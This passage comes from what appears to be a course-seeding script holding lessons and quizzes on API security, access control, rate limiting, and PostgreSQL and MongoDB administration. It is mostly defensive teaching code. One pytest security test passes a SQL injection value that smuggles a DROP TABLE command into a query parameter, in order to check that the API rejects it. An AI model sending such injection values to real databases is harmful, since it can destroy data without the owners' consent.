- OAuth Security: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
- OpenID Connect: https://openid.net/connect/`,
            questions: [
              { text: 'Which OAuth flow is most secure for server-side apps?', answers: [{ text: 'Authorization Code flow', isCorrect: true }, { text: 'Implicit flow', isCorrect: false }, { text: 'Resource Owner Password flow', isCorrect: false }, { text: 'Client Credentials flow', isCorrect: false }] },
              { text: 'When is Client Credentials flow used?', answers: [{ text: 'Machine-to-machine authentication without user involvement', isCorrect: true }, { text: 'User-facing web applications', isCorrect: false }, { text: 'Mobile applications', isCorrect: false }, { text: 'Single-page applications only', isCorrect: false }] },
              { text: 'What enables persistent sessions in OAuth?', answers: [{ text: 'Refresh tokens that obtain new access tokens', isCorrect: true }, { text: 'Long-lived access tokens', isCorrect: false }, { text: 'Session cookies only', isCorrect: false }, { text: 'Client secrets only', isCorrect: false }] },
              { text: 'What is the state parameter used for?', answers: [{ text: 'Preventing CSRF attacks by validating request origin', isCorrect: true }, { text: 'Storing user data', isCorrect: false }, { text: 'Encrypting tokens', isCorrect: false }, { text: 'Rate limiting requests', isCorrect: false }] },
            ],
          },
          {
            title: 'Role-Based Access Control',
            order: 2,
            content: `# Role-Based Access Control

### Learning Objectives

- Design RBAC systems for API authorization
- Implement permission-based access control
- Handle multi-tenant authorization
- Audit access control decisions

### Section 1: RBAC Fundamentals

RBAC assigns permissions to roles, and users to roles. This simplifies authorization management. Roles represent job functions. Permissions represent specific actions on resources.

\`\`\`python
# RBAC implementation
ROLES = {
    'admin': ['users:read', 'users:write', 'users:delete', 'posts:read', 'posts:write'],
    'editor': ['posts:read', 'posts:write', 'posts:delete'],
    'viewer': ['posts:read']
}

def check_permission(user_role, required_permission):
    return required_permission in ROLES.get(user_role, [])

# Middleware
def require_permission(permission):
    def decorator(func):
        def wrapper(request, *args, **kwargs):
            if not check_permission(request.user.role, permission):
                return Response(status=403)
            return func(request, *args, **kwargs)
        return wrapper
    return decorator
\`\`\`

### Section 2: Attribute-Based Access Control

ABAC extends RBAC with attribute conditions. Policies consider user attributes, resource attributes, and environment conditions. Enables fine-grained, context-aware authorization.

### Section 3: Multi-Tenant Authorization

SaaS applications must isolate tenant data. Row-level security ensures queries only return authorized data. Tenant context is established at authentication time.

\`\`\`python
# Multi-tenant middleware
def multi_tenant_middleware(func):
    def wrapper(request, *args, **kwargs):
        tenant_id = request.user.tenant_id
        # Set tenant context for database queries
        with tenant_context(tenant_id):
            return func(request, *args, **kwargs)
    return wrapper
\`\`\`

### Section 4: Audit Logging

Log all authorization decisions. Track who accessed what, when, and why. Support compliance requirements. Enable forensic analysis.

### Hands-On Practice

1. Design an RBAC system for a blog application with multiple user roles.
2. Implement permission checking middleware.
3. Add audit logging for authorization decisions.

### Key Takeaways

- RBAC simplifies authorization by grouping permissions into roles
- ABAC provides fine-grained, context-aware access control
- Multi-tenant isolation requires row-level security
- Audit logging supports compliance and forensics

### References

- RBAC: https://csrc.nist.gov/Projects/rbac/
- ABAC: https://csrc.nist.gov/Projects/abac
- Authorization Patterns: https://www.udacity.com/course/api-design-and-development--ud388`,
            questions: [
              { text: 'What does RBAC simplify?', answers: [{ text: 'Authorization management by grouping permissions into roles', isCorrect: true }, { text: 'Database queries', isCorrect: false }, { text: 'Network configuration', isCorrect: false }, { text: 'File system management', isCorrect: false }] },
              { text: 'What does ABAC extend RBAC with?', answers: [{ text: 'Attribute conditions for context-aware authorization', isCorrect: true }, { text: 'Faster query execution', isCorrect: false }, { text: 'Better caching', isCorrect: false }, { text: 'Simpler roles', isCorrect: false }] },
              { text: 'Why is row-level security important?', answers: [{ text: 'Ensures multi-tenant data isolation at the database level', isCorrect: true }, { text: 'Improves query performance', isCorrect: false }, { text: 'Reduces storage costs', isCorrect: false }, { text: 'Simplifies schema design', isCorrect: false }] },
              { text: 'What should audit logging track?', answers: [{ text: 'Who accessed what, when, and why for compliance and forensics', isCorrect: true }, { text: 'Only successful access attempts', isCorrect: false }, { text: 'Only user login times', isCorrect: false }, { text: 'Only failed requests', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'API Security Testing',
        order: 3,
        lessons: [
          {
            title: 'OWASP API Security Top 10',
            order: 1,
            content: `# OWASP API Security Top 10

### Learning Objectives

- Understand the most critical API security risks
- Implement defenses against common API attacks
- Test APIs for OWASP Top 10 vulnerabilities
- Apply security best practices to prevent each risk

### Section 1: API1 - Broken Object Level Authorization

Attackers manipulate object IDs to access unauthorized data. Prevent by validating object ownership on every request. Use indirect references and access control checks.

\`\`\`python
# Secure object access
@app.get('/api/v1/posts/<int:post_id>')
@require_auth
def get_post(post_id):
    post = Post.query.get_or_404(post_id)
    if post.author_id != current_user.id and not current_user.is_admin:
        return jsonify({'error': 'Unauthorized'}), 403
    return jsonify(post.to_dict())
\`\`\`

### Section 2: API2 - Broken Authentication

Weak authentication enables account takeover. Use multi-factor authentication. Implement rate limiting on authentication endpoints. Use secure password storage. Monitor for brute force attacks.

### Section 3: API3 - Excessive Data Exposure

APIs return more data than necessary. Apply response filtering. Use field selection. Implement data minimization. Mask sensitive data in production.

### Section 4: API4 - Lack of Resources & Rate Limiting

Without rate limiting, APIs are vulnerable to DoS and brute force. Implement per-user, per-IP, and per-endpoint rate limits. Use sliding window algorithms.

\`\`\`python
from functools import wraps
import time

rate_limit_store = {}

def rate_limit(max_requests, window_seconds):
    def decorator(func):
        @wraps(func)
        def wrapper(request, *args, **kwargs):
            key = f"{request.remote_addr}:{func.__name__}"
            now = time.time()
            window_start = now - window_seconds

            # Clean old entries
            rate_limit_store[key] = [t for t in rate_limit_store.get(key, []) if t > window_start]

            if len(rate_limit_store.get(key, [])) >= max_requests:
                return jsonify({'error': 'Rate limit exceeded'}), 429

            rate_limit_store.setdefault(key, []).append(now)
            return func(request, *args, **kwargs)
        return wrapper
    return decorator
\`\`\`

### Hands-On Practice

1. Test an API for broken object level authorization vulnerabilities.
2. Implement rate limiting on authentication endpoints.
3. Create response filters that prevent excessive data exposure.

### Key Takeaways

- Broken object level authorization is the most critical API risk
- Strong authentication prevents account takeover
- Data minimization reduces information leakage
- Rate limiting prevents DoS and brute force attacks

### References

- OWASP API Security: https://owasp.org/API-Security/
- API Security Top 10: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- API Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/API_Security_Cheat_Sheet.html`,
            questions: [
              { text: 'What is the most critical OWASP API security risk?', answers: [{ text: 'Broken object level authorization', isCorrect: true }, { text: 'Excessive data exposure', isCorrect: false }, { text: 'Lack of rate limiting', isCorrect: false }, { text: 'Broken authentication', isCorrect: false }] },
              { text: 'How do you prevent broken object level authorization?', answers: [{ text: 'Validate object ownership on every request', isCorrect: true }, { text: 'Use GET requests only', isCorrect: false }, { text: 'Encrypt all responses', isCorrect: false }, { text: 'Use longer URLs', isCorrect: false }] },
              { text: 'What does rate limiting prevent?', answers: [{ text: 'DoS attacks and brute force attempts', isCorrect: true }, { text: 'SQL injection', isCorrect: false }, { text: 'Cross-site scripting', isCorrect: false }, { text: 'Man-in-the-middle attacks', isCorrect: false }] },
              { text: 'What is excessive data exposure?', answers: [{ text: 'APIs returning more data than necessary for the use case', isCorrect: true }, { text: 'Using HTTPS instead of HTTP', isCorrect: false }, { text: 'Implementing rate limiting', isCorrect: false }, { text: 'Using strong passwords', isCorrect: false }] },
            ],
          },
          {
            title: 'Security Testing Automation',
            order: 2,
            content: `# Security Testing Automation

### Learning Objectives

- Automate API security testing in CI/CD pipelines
- Implement security-specific test cases
- Use automated tools for vulnerability scanning
- Create security regression test suites

### Section 1: Security Test Cases

Every API endpoint needs security test cases. Test authentication bypass, authorization escalation, input validation, and rate limiting. Automated testing catches regressions.

\`\`\`python
import pytest
import requests

BASE_URL = "http://localhost:3000/api/v1"

class TestAPISecurity:
    def test_unauthenticated_access_denied(self):
        response = requests.get(f"{BASE_URL}/posts")
        assert response.status_code == 401

    def test_forbidden_access(self):
        token = get_token_for_role('viewer')
        response = requests.delete(
            f"{BASE_URL}/posts/1",
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code == 403

    def test_sql_injection_prevented(self):
        response = requests.get(
            f"{BASE_URL}/posts?search='; DROP TABLE posts; --"
        )
        assert response.status_code == 400

    def test_rate_limit_enforced(self):
        for _ in range(100):
            response = requests.get(f"{BASE_URL}/posts")
        assert response.status_code == 429
\`\`\`

### Section 2: Automated Security Scanning

Integrate OWASP ZAP, Nikto, or custom scanners into CI/CD pipelines. Run security scans on every deployment. Generate security reports automatically.

### Section 3: Contract Testing

Verify API contracts for security properties. Ensure response schemas don't expose sensitive fields. Validate authentication requirements for endpoints.

### Section 4: Security Regression

Track security test results over time. Detect security regressions early. Maintain a security test suite alongside functional tests.

### Hands-On Practice

1. Write security test cases for authentication and authorization.
2. Set up automated security scanning in a CI pipeline.
3. Create a security regression test suite.

### Key Takeaways

- Security test cases prevent common API vulnerabilities
- Automated scanning catches vulnerabilities in CI/CD
- Contract testing ensures security properties of API contracts
- Security regression testing prevents reintroduction of fixed vulnerabilities

### References

- OWASP ZAP: https://www.zaproxy.org/
- Security Testing: https://owasp.org/www-project-web-security-testing-guide/
- API Testing: https://github.com/Swagger2Markup/swagger2markup`,
            questions: [
              { text: 'What should every API endpoint have?', answers: [{ text: 'Security test cases for authentication, authorization, and input validation', isCorrect: true }, { text: 'Only functional tests', isCorrect: false }, { text: 'No tests at all', isCorrect: false }, { text: 'Only performance tests', isCorrect: false }] },
              { text: 'What does security regression testing prevent?', answers: [{ text: 'Reintroduction of previously fixed vulnerabilities', isCorrect: true }, { text: 'New features from being added', isCorrect: false }, { text: 'Performance improvements', isCorrect: false }, { text: 'Documentation updates', isCorrect: false }] },
              { text: 'What tool automates security scanning?', answers: [{ text: 'OWASP ZAP', isCorrect: true }, { text: 'ESLint only', isCorrect: false }, { text: 'Prettier only', isCorrect: false }, { text: 'Webpack only', isCorrect: false }] },
              { text: 'What does contract testing verify?', answers: [{ text: 'Security properties of API contracts are maintained', isCorrect: true }, { text: 'Code formatting standards', isCorrect: false }, { text: 'Database performance', isCorrect: false }, { text: 'Network latency', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'API Gateway & Rate Limiting',
        order: 4,
        lessons: [
          {
            title: 'API Gateway Architecture',
            order: 1,
            content: `# API Gateway Architecture

### Learning Objectives

- Design API gateway patterns for microservices
- Implement request routing and load balancing
- Add cross-cutting concerns at the gateway level
- Handle API composition and aggregation

### Section 1: Gateway Pattern

API gateways provide a single entry point for client requests. They handle routing, authentication, rate limiting, and protocol translation. Gateways simplify client integration with microservices.

### Section 2: Request Routing

Route requests to appropriate backend services based on path, headers, or other criteria. Support path-based, host-based, and header-based routing. Implement service discovery integration.

\`\`\`
# Gateway routing examples
/api/v1/users/**     -> user-service:8080
/api/v1/posts/**     -> post-service:8080
/api/v1/auth/**      -> auth-service:8080
/api/v1/search/**    -> search-service:8080
\`\`\`

### Section 3: Protocol Translation

Gateways translate between client-facing protocols and internal protocols. REST to gRPC translation. WebSocket proxying. Protocol buffers for internal communication.

### Section 4: API Composition

Aggregate responses from multiple services. Client makes a single request to the gateway. Gateway calls multiple services and combines results. Reduces client-side complexity.

### Hands-On Practice

1. Design an API gateway architecture for a microservices application.
2. Configure path-based routing rules.
3. Implement API composition that aggregates responses from multiple services.

### Key Takeaways

- Gateways provide single entry points for microservices
- Request routing directs traffic to appropriate services
- Protocol translation enables heterogeneous service communication
- API composition reduces client-side complexity

### References

- API Gateway Pattern: https://microservices.io/patterns/apigateway.html
- Kong: https://konghq.com/
- AWS API Gateway: https://aws.amazon.com/api-gateway/`,
            questions: [
              { text: 'What does an API gateway provide for microservices?', answers: [{ text: 'Single entry point handling routing, authentication, and protocol translation', isCorrect: true }, { text: 'Database connections only', isCorrect: false }, { text: 'File storage only', isCorrect: false }, { text: 'Email services only', isCorrect: false }] },
              { text: 'What is API composition?', answers: [{ text: 'Aggregating responses from multiple services into a single response', isCorrect: true }, { text: 'Creating new API endpoints', isCorrect: false }, { text: 'Deleting unused endpoints', isCorrect: false }, { text: 'Documenting APIs', isCorrect: false }] },
              { text: 'What does protocol translation enable?', answers: [{ text: 'Communication between services using different protocols', isCorrect: true }, { text: 'Faster network connections', isCorrect: false }, { text: 'Better encryption', isCorrect: false }, { text: 'Simpler code', isCorrect: false }] },
              { text: 'What types of routing do gateways support?', answers: [{ text: 'Path-based, host-based, and header-based routing', isCorrect: true }, { text: 'Only IP-based routing', isCorrect: false }, { text: 'Only DNS-based routing', isCorrect: false }, { text: 'Only MAC-based routing', isCorrect: false }] },
            ],
          },
          {
            title: 'Rate Limiting & Throttling',
            order: 2,
            content: `# Rate Limiting & Throttling

### Learning Objectives

- Implement various rate limiting algorithms
- Design throttling policies for API consumers
- Handle rate limit exceeded responses properly
- Monitor and analyze rate limiting metrics

### Section 1: Rate Limiting Algorithms

Token bucket allows burst capacity. Sliding window provides smooth rate limiting. Fixed window is simplest but has edge cases. Leaky bucket provides consistent output rate.

\`\`\`python
import time
from collections import defaultdict

class SlidingWindowRateLimiter:
    def __init__(self, max_requests, window_seconds):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests = defaultdict(list)

    def is_allowed(self, key):
        now = time.time()
        window_start = now - self.window_seconds
        self.requests[key] = [t for t in self.requests[key] if t > window_start]

        if len(self.requests[key]) >= self.max_requests:
            return False

        self.requests[key].append(now)
        return True

    def get_retry_after(self, key):
        if self.requests[key]:
            oldest = self.requests[key][0]
            return max(0, self.window_seconds - (time.time() - oldest))
        return 0
\`\`\`

### Section 2: Throttling Policies

Tiered rate limits based on subscription level. Endpoint-specific limits. User-based quotas. Time-based restrictions. Burst allowances.

### Section 3: Rate Limit Responses

Return proper HTTP 429 Too Many Requests status. Include Retry-After header. Provide rate limit headers (X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset). Support client-side backoff.

### Section 4: Monitoring & Analytics

Track rate limiting metrics: total requests, rejected requests, rejection rates. Analyze patterns to optimize limits. Monitor for abuse patterns.

### Hands-On Practice

1. Implement a sliding window rate limiter.
2. Create tiered rate limiting policies for different API tiers.
3. Add rate limit headers to all API responses.

### Key Takeaways

- Different algorithms suit different use cases
- Proper rate limit responses help clients implement backoff
- Tiered limits support different subscription levels
- Monitoring enables data-driven limit optimization

### References

- Rate Limiting Patterns: https://cloud.google.com/architecture/rate-limiting-strategies-techniques
- HTTP 429: https://tools.ietf.org/html/rfc6585
- API Rate Limiting: https://www.javelin.io/rate-limiting`,
            questions: [
              { text: 'Which rate limiting algorithm allows burst capacity?', answers: [{ text: 'Token bucket', isCorrect: true }, { text: 'Leaky bucket', isCorrect: false }, { text: 'Fixed window', isCorrect: false }, { text: 'Sliding window', isCorrect: false }] },
              { text: 'What HTTP status code indicates rate limiting?', answers: [{ text: '429 Too Many Requests', isCorrect: true }, { text: '404 Not Found', isCorrect: false }, { text: '500 Internal Server Error', isCorrect: false }, { text: '403 Forbidden', isCorrect: false }] },
              { text: 'What headers help clients with rate limiting?', answers: [{ text: 'Retry-After, X-RateLimit-Limit, X-RateLimit-Remaining', isCorrect: true }, { text: 'Content-Type only', isCorrect: false }, { text: 'Accept only', isCorrect: false }, { text: 'Cache-Control only', isCorrect: false }] },
              { text: 'Why use tiered rate limiting?', answers: [{ text: 'Support different subscription levels with different access quotas', isCorrect: true }, { text: 'Simplify server code', isCorrect: false }, { text: 'Reduce network traffic', isCorrect: false }, { text: 'Improve database performance', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 7. Database Administration & Security
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Database Administration & Security',
    'Comprehensive database administration course covering PostgreSQL, MongoDB, database security, performance tuning, backup strategies, and compliance. Students will manage production database systems with security-first approach.',
    30,
    [
      {
        title: 'Database Fundamentals',
        order: 1,
        lessons: [
          {
            title: 'Database Architecture & Design',
            order: 1,
            content: `# Database Architecture & Design

### Learning Objectives

- Understand database engine architecture
- Design efficient database schemas
- Implement normalization and denormalization strategies
- Choose appropriate data types for each use case

### Section 1: Storage Engine Architecture

Database engines manage data storage, retrieval, and transaction processing. B-tree indexes enable fast lookups. Buffer pools cache frequently accessed data. Write-ahead logging ensures durability.

### Section 2: Schema Design Principles

Normalize to at least 3NF for data integrity. Denormalize strategically for read performance. Use proper constraints (NOT NULL, UNIQUE, FOREIGN KEY). Document schema decisions.

\`\`\`sql
-- Normalized schema design
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    name VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE posts (
    id SERIAL PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    content TEXT,
    author_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_posts_author ON posts(author_id);
CREATE INDEX idx_posts_created ON posts(created_at DESC);
\`\`\`

### Section 3: Normalization

First Normal Form (1NF): atomic values, no repeating groups. Second Normal Form (2NF): no partial dependencies. Third Normal Form (3NF): no transitive dependencies. Higher normal forms reduce redundancy.

### Section 4: Denormalization Strategies

Denormalize for read-heavy workloads. Materialized views pre-compute expensive joins. Summary tables store aggregate data. Cache frequently accessed joins.

### Hands-On Practice

1. Design a normalized schema for an e-commerce application.
2. Identify denormalization opportunities for read performance.
3. Implement proper indexes for common query patterns.

### Key Takeaways

- Storage engine architecture affects performance characteristics
- Normalization prevents data anomalies and redundancy
- Strategic denormalization improves read performance
- Proper indexing is critical for query performance

### References

- Database Internals: https://www.amazon.com/Database-Internals-Deep-Distributed-Systems/dp/1492040347
- PostgreSQL Documentation: https://www.postgresql.org/docs/
- Schema Design: https://www.postgresql.org/docs/current/ddl.html`,
            questions: [
              { text: 'What does normalization prevent?', answers: [{ text: 'Data anomalies and redundancy through structured decomposition', isCorrect: true }, { text: 'Faster query execution', isCorrect: false }, { text: 'Data encryption', isCorrect: false }, { text: 'Network latency', isCorrect: false }] },
              { text: 'When should you denormalize?', answers: [{ text: 'For read-heavy workloads where joins are expensive', isCorrect: true }, { text: 'Always, for all applications', isCorrect: false }, { text: 'Never, it is always bad', isCorrect: false }, { text: 'Only for write-heavy workloads', isCorrect: false }] },
              { text: 'What is 3NF?', answers: [{ text: 'No transitive dependencies between non-key attributes', isCorrect: true }, { text: 'Three tables in a schema', isCorrect: false }, { text: 'Three indexes per table', isCorrect: false }, { text: 'Three normal users', isCorrect: false }] },
              { text: 'What do B-tree indexes enable?', answers: [{ text: 'Fast lookups with logarithmic time complexity', isCorrect: true }, { text: 'Only sorted output', isCorrect: false }, { text: 'Only range queries', isCorrect: false }, { text: 'Only full-text search', isCorrect: false }] },
            ],
          },
          {
            title: 'SQL Mastery',
            order: 2,
            content: `# SQL Mastery

### Learning Objectives

- Write complex SQL queries with joins and subqueries
- Use window functions for analytical queries
- Implement CTEs for readable complex queries
- Optimize SQL query performance

### Section 1: Joins and Subqueries

INNER JOIN returns matching rows. LEFT/RIGHT JOIN returns all rows from one table. FULL JOIN returns all rows. Subqueries enable complex filtering and aggregation.

\`\`\`sql
-- Complex join with aggregation
SELECT
    u.name,
    COUNT(p.id) as post_count,
    MAX(p.created_at) as last_post
FROM users u
LEFT JOIN posts p ON p.author_id = u.id
GROUP BY u.id, u.name
HAVING COUNT(p.id) > 5
ORDER BY post_count DESC;
\`\`\`

### Section 2: Window Functions

Window functions perform calculations across row sets. ROW_NUMBER(), RANK(), DENSE_RANK() for numbering. LAG(), LEAD() for navigation. SUM() OVER() for running totals.

\`\`\`sql
-- Running total and ranking
SELECT
    date,
    revenue,
    SUM(revenue) OVER (ORDER BY date) as running_total,
    RANK() OVER (ORDER BY revenue DESC) as revenue_rank
FROM daily_sales;
\`\`\`

### Section 3: Common Table Expressions

CTEs improve query readability and enable recursive queries. WITH clauses create named result sets. Recursive CTEs traverse hierarchical data.

### Section 4: Query Optimization

EXPLAIN ANALYZE reveals query plans. Use appropriate JOIN types. Avoid SELECT *. Filter early. Use covering indexes. Limit result sets.

### Hands-On Practice

1. Write a complex query using multiple joins and aggregations.
2. Implement window functions for analytical reporting.
3. Use recursive CTEs to traverse hierarchical data.

### Key Takeaways

- JOINs combine data from multiple tables
- Window functions enable complex analytical queries
- CTEs improve query readability and enable recursion
- EXPLAIN ANALYZE is essential for query optimization

### References

- PostgreSQL Tutorial: https://www.postgresqltutorial.com/
- Window Functions: https://www.postgresql.org/docs/current/tutorial-window.html
- SQL Performance Explained: https://use-the-index-luke.com/`,
            questions: [
              { text: 'What do window functions enable?', answers: [{ text: 'Calculations across sets of rows without grouping', isCorrect: true }, { text: 'Only basic filtering', isCorrect: false }, { text: 'Only data modification', isCorrect: false }, { text: 'Only schema creation', isCorrect: false }] },
              { text: 'What does a recursive CTE do?', answers: [{ text: 'Traverses hierarchical data structures like org charts', isCorrect: true }, { text: 'Creates indexes automatically', isCorrect: false }, { text: 'Deletes duplicate rows', isCorrect: false }, { text: 'Backs up databases', isCorrect: false }] },
              { text: 'What does EXPLAIN ANALYZE show?', answers: [{ text: 'Query execution plan with actual timing and row counts', isCorrect: true }, { text: 'Only query syntax errors', isCorrect: false }, { text: 'Database schema', isCorrect: false }, { text: 'User permissions', isCorrect: false }] },
              { text: 'Why filter early in queries?', answers: [{ text: 'Reduces the amount of data processed in later stages', isCorrect: true }, { text: 'Makes queries shorter', isCorrect: false }, { text: 'Increases memory usage', isCorrect: false }, { text: 'Improves code readability only', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'PostgreSQL Administration',
        order: 2,
        lessons: [
          {
            title: 'PostgreSQL Configuration & Tuning',
            order: 1,
            content: `# PostgreSQL Configuration & Tuning

### Learning Objectives

- Configure PostgreSQL for optimal performance
- Tune memory, connection, and I/O parameters
- Monitor database performance metrics
- Implement connection pooling

### Section 1: Memory Configuration

shared_buffers: 25% of RAM for data caching. effective_cache_size: 75% of RAM for query planner. work_mem: memory for sort and hash operations. maintenance_work_mem: memory for VACUUM and CREATE INDEX.

### Section 2: Connection Configuration

max_connections: total simultaneous connections. superuser_reserved_connections: connections for administrators. idle_in_transaction_session_timeout: kill idle transactions. statement_timeout: kill long-running queries.

\`\`\`sql
-- Optimal configuration for 16GB RAM server
ALTER SYSTEM SET shared_buffers = '4GB';
ALTER SYSTEM SET effective_cache_size = '12GB';
ALTER SYSTEM SET work_mem = '256MB';
ALTER SYSTEM SET maintenance_work_mem = '1GB';
ALTER SYSTEM SET max_connections = 200;
ALTER SYSTEM SET idle_in_transaction_session_timeout = '5min';
ALTER SYSTEM SET statement_timeout = '30s';
SELECT pg_reload_conf();
\`\`\`

### Section 3: Performance Monitoring

pg_stat_statements tracks query performance. pg_stat_user_tables shows table statistics. pg_stat_activity monitors active connections. pgBadger analyzes logs.

### Section 4: Connection Pooling

PgBouncer provides lightweight connection pooling. Transaction-level pooling for efficiency. Session-level pooling for persistent connections. Connection pooling reduces overhead.

### Hands-On Practice

1. Configure PostgreSQL memory parameters for a specific server configuration.
2. Set up pg_stat_statements for query performance monitoring.
3. Configure PgBouncer for connection pooling.

### Key Takeaways

- Memory configuration directly affects performance
- Connection management prevents resource exhaustion
- Performance monitoring identifies bottlenecks
- Connection pooling reduces connection overhead

### References

- PostgreSQL Tuning: https://wiki.postgresql.org/wiki/Tuning_Your_PostgreSQL_Server
- PgBouncer: https://www.pgbouncer.org/
- pg_stat_statements: https://www.postgresql.org/docs/current/pgstatstatements.html`,
            questions: [
              { text: 'What should shared_buffers be set to?', answers: [{ text: '25% of available RAM for optimal data caching', isCorrect: true }, { text: '100% of RAM', isCorrect: false }, { text: '1 MB always', isCorrect: false }, { text: '0 to disable caching', isCorrect: false }] },
              { text: 'What does pg_stat_statements track?', answers: [{ text: 'Query execution statistics for performance analysis', isCorrect: true }, { text: 'User login attempts only', isCorrect: false }, { text: 'Schema changes only', isCorrect: false }, { text: 'Backup status only', isCorrect: false }] },
              { text: 'What is the purpose of PgBouncer?', answers: [{ text: 'Lightweight connection pooling to reduce connection overhead', isCorrect: true }, { text: 'Query optimization only', isCorrect: false }, { text: 'Schema management only', isCorrect: false }, { text: 'Backup management only', isCorrect: false }] },
              { text: 'Why set statement_timeout?', answers: [{ text: 'Prevent long-running queries from consuming resources', isCorrect: true }, { text: 'Speed up queries', isCorrect: false }, { text: 'Increase memory usage', isCorrect: false }, { text: 'Reduce disk usage', isCorrect: false }] },
            ],
          },
          {
            title: 'Backup & Recovery',
            order: 2,
            content: `# Backup & Recovery

### Learning Objectives

- Implement PostgreSQL backup strategies
- Configure point-in-time recovery
- Test backup restoration procedures
- Automate backup verification

### Section 1: Backup Types

Full backup: complete database copy. Incremental backup: only changed pages. Continuous archiving: WAL-based backup for point-in-time recovery. pg_dump for logical backups, pg_basebackup for physical backups.

\`\`\`bash
# Logical backup with pg_dump
pg_dump -h localhost -U postgres -d mydb -Fc -f backup.dump

# Physical backup with pg_basebackup
pg_basebackup -h localhost -U replicator -D /backup -Fp -Xs -P

# Automated daily backup script
#!/bin/bash
BACKUP_DIR="/backups/$(date +%Y%m%d)"
mkdir -p $BACKUP_DIR
pg_dump -h localhost -U postgres -d mydb -Fc -f $BACKUP_DIR/mydb.dump
\`\`\`

### Section 2: Point-in-Time Recovery

Configure WAL archiving for PITR. Restore base backup, then replay WAL segments to desired timestamp. Essential for disaster recovery and compliance.

### Section 3: Recovery Testing

Test backups regularly. Automate restore verification. Measure recovery time objectives (RTO) and recovery point objectives (RPO). Document recovery procedures.

### Section 4: Backup Security

Encrypt backups at rest. Secure backup storage. Implement access controls on backup files. Rotate backup retention.

### Hands-On Practice

1. Set up automated daily backups with pg_dump.
2. Configure WAL archiving for point-in-time recovery.
3. Test backup restoration and measure RTO.

### Key Takeaways

- Multiple backup types address different recovery scenarios
- Point-in-time recovery enables recovery to any moment
- Regular testing ensures backups are recoverable
- Backup security protects against unauthorized access

### References

- PostgreSQL Backup: https://www.postgresql.org/docs/current/backup.html
- PITR: https://www.postgresql.org/docs/current/continuous-archiving.html
- pg_dump: https://www.postgresql.org/docs/current/app-pgdump.html`,
            questions: [
              { text: 'What is point-in-time recovery?', answers: [{ text: 'Recovering the database to any specific moment using WAL archiving', isCorrect: true }, { text: 'Recovering only the latest backup', isCorrect: false }, { text: 'Recovering only schema changes', isCorrect: false }, { text: 'Recovering only user data', isCorrect: false }] },
              { text: 'What is the difference between pg_dump and pg_basebackup?', answers: [{ text: 'pg_dump creates logical backups; pg_basebackup creates physical backups', isCorrect: true }, { text: 'They are identical', isCorrect: false }, { text: 'pg_dump is faster always', isCorrect: false }, { text: 'pg_basebackup creates SQL files', isCorrect: false }] },
              { text: 'Why test backups regularly?', answers: [{ text: 'Ensure backups are actually recoverable when needed', isCorrect: true }, { text: 'To make backups larger', isCorrect: false }, { text: 'To use more storage', isCorrect: false }, { text: 'To slow down recovery', isCorrect: false }] },
              { text: 'What should backup security include?', answers: [{ text: 'Encryption at rest, access controls, and secure storage', isCorrect: true }, { text: 'No security needed for backups', isCorrect: false }, { text: 'Only password protection', isCorrect: false }, { text: 'Only file compression', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'MongoDB Administration',
        order: 3,
        lessons: [
          {
            title: 'MongoDB Performance & Indexing',
            order: 1,
            content: `# MongoDB Performance & Indexing

### Learning Objectives

- Create effective MongoDB indexes
- Monitor MongoDB performance metrics
- Optimize query patterns for MongoDB
- Implement sharding for horizontal scaling

### Section 1: Index Types

Single field indexes on individual fields. Compound indexes on multiple fields. Multikey indexes on array fields. Text indexes for full-text search. Geospatial indexes for location data.

\`\`\`javascript
// Create compound index
db.users.createIndex({ email: 1, created_at: -1 })

// Create text index
db.posts.createIndex({ title: "text", content: "text" })

// Create TTL index for automatic expiration
db.sessions.createIndex({ expiresAt: 1 }, { expireAfterSeconds: 0 })
\`\`\`

### Section 2: Query Optimization

Use explain() to analyze query plans.covered queries include all fields in the index. Avoid collection scans. Use limit() and projection to reduce data transfer.

### Section 3: Sharding

Horizontal scaling across multiple servers. Choose shard keys carefully. Hashed sharding for even distribution. Ranged sharding for range queries.

### Section 4: Monitoring

mongostat and mongotop for real-time metrics. db.currentOp() for active operations. db.serverStatus() for server metrics. MongoDB Atlas monitoring.

### Hands-On Practice

1. Analyze slow queries with explain() and create appropriate indexes.
2. Set up a sharded cluster with proper shard key selection.
3. Monitor MongoDB performance and identify bottlenecks.

### Key Takeaways

- Proper indexes are critical for MongoDB performance
- explain() reveals query execution details
- Shard key selection affects data distribution and query efficiency
- Monitoring identifies performance bottlenecks

### References

- MongoDB Indexing: https://www.mongodb.com/docs/manual/indexes/
- MongoDB Performance: https://www.mongodb.com/docs/manual/core/performance/
- MongoDB Sharding: https://www.mongodb.com/docs/manual/sharding/`,
            questions: [
              { text: 'What does explain() reveal?', answers: [{ text: 'Query execution plan including index usage and document scans', isCorrect: true }, { text: 'Only query syntax errors', isCorrect: false }, { text: 'Database schema only', isCorrect: false }, { text: 'User permissions only', isCorrect: false }] },
              { text: 'What is a covered query?', answers: [{ text: 'A query where all fields are in the index, requiring no document lookup', isCorrect: true }, { text: 'A query that covers all collections', isCorrect: false }, { text: 'A query that returns all documents', isCorrect: false }, { text: 'A query with no filters', isCorrect: false }] },
              { text: 'What is the difference between hashed and ranged sharding?', answers: [{ text: 'Hashed distributes evenly; ranged supports range queries', isCorrect: true }, { text: 'They are identical', isCorrect: false }, { text: 'Hashed is slower', isCorrect: false }, { text: 'Ranged uses more storage', isCorrect: false }] },
